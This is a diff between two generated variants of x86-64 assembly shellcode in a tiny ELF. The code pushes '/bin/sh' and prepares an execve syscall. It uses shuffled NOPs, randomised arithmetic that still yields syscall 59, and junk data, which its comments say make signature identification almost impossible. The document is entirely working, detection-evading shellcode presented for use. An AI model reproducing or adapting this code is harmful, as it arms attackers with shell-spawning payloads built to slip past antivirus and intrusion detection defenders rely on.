@@ -13,7 +13,7 @@
 ;
 ; Have happy fun! Do not be bad man. Do not be illegal man
 ;
-; Generate 2024-10-10 22:38:05
+; Generate 2024-10-10 22:45:10
 
 bits 64
             org 0x08048000
@@ -51,18 +51,18 @@ phdr:                                           ; Elf64_Phdr
 phdrsize    equ     $ - phdr
 
 _start:
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
+    nop				; No operation, Actually do nothing.
     mov rax, 0x68732f6e69622f 	; mov  value "/bin/sh" in hex to rax
     push rax
     push rsp
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
-    nop				; No operation, Actually do nothing.
     pop rdi
     sub eax, eax		; Random way to make eax equal 0
     push rax
-    mov al, 199			; Mutate function, start with random value
-    add al, 23			; add random value
-    sub al, 163			; make sure al has value 59 for exec syscall
+    mov al, 184			; Mutate function, start with random value
+    add al, 43			; add random value
+    sub al, 168			; make sure al has value 59 for exec syscall
     push rsp
     pop rdx
     push rsp
@@ -72,5 +72,5 @@ filesize      equ     $ - $$
 
 ; Insert generate junk. Can be removed but only add 8-10 bytes.
 ; Make signature identification almost impossible.
-section .data
-seed db "tt5f Iwx"
+; section .data
+; seed db "FXm8'37_"
